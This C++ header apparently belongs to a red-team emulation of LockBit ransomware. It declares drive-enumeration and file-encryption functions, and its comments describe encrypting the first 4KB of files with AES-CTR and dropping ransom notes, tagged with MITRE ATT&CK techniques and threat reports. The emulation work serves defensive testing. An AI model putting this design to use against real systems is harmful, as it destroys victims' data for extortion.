#pragma once

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <format>
#include <string>
#include <vector>
#include <Windows.h>
#include <errhandlingapi.h>
#include <fileapi.h>
#include "config.hpp"
#include "threadpool.hpp"

#define LB_ENUMERATE_ONLY 1
#define LB_ENCRYPT_FILES 2
#define LB_DECRYPT_FILES 3

using FP_GetLogicalDriveStringsW = decltype(&GetLogicalDriveStringsW);

// Defined in src/common/enumerate.cpp
namespace enumerate {

/*
 * GetLogicalDrives:
 *      About:
 *          Gets the drive strings (e.g. "C:\\", "D:\\") for the available logical drives on the
 *          local system using the GetLogicalDriveStringsW API call.
 *      Result:
 *          Vector of drive strings
 *      MITRE ATT&CK Techniques:
 *          T1083: File and Directory Discovery
 *          T1106: Native API
 *      CTI:
 *          https://www.sangfor.com/farsight-labs-threat-intelligence/cybersecurity/lockbit-green-ransomware-conti-based-encryptor
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a
 *          https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-lockbit
 */
std::vector<std::wstring> GetLogicalDrives();

/*
 * EnumerateAndEncrypt:
 *      About:
 *          Uses thread pool to search for and encrypt all valid target files and subdirectories starting at 
 *          start_dir. If track_processed_files is set to true, the function will track which files were processed,
 *          and the caller can get a vector to such file paths by calling enumerate::GetProcessedFiles.
 *          Value for processing_mode will determine whether or not the files get encrypted, decrypted, or untouched
 *          (enumerate only).
 *          IF encrypting files, the first 4KB of the file will be encrypted, or the entire file if smaller than 4KB,
 *          using 256-bit AES in CTR mode. Appends IV and AES key to the encrypted file. After encrypting files in the
 *          directory, a ransom note will be dropped with filename <extension.README.txt.
 *          File and directory enumeration is done using FindFirstFileW and FindNextFileW API calls.
 *          File reads and writes are performed using the CreateFileW, ReadFile, and WriteFile API calls.
 *      Result:
 *          Enumerates files and encrypts/decrypts valid targets, drops ransom note if encrypting files.
 *      MITRE ATT&CK Techniques:
 *          T1486: Data Encrypted for Impact
 *          T1106: Native API
 *          T1083: File and Directory Discovery
 *      CTI:
 *          https://www.antiy.net/p/analysis-of-lockbit-ransomware-samples-and-considerations-for-defense-against-targeted-ransomware/
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a
 *          https://redpiranha.net/news/look-lockbit-3-ransomware
 */
void EnumerateAndEncrypt(Config& cfg, std::vector<std::wstring>& start_dirs, bool track_processed_files, int processing_mode);

// Gets copy of the processed file paths vector
std::vector<std::wstring> GetProcessedFiles();

// Empties the processed file paths vector
void ClearProcessedFiles();

} // namespace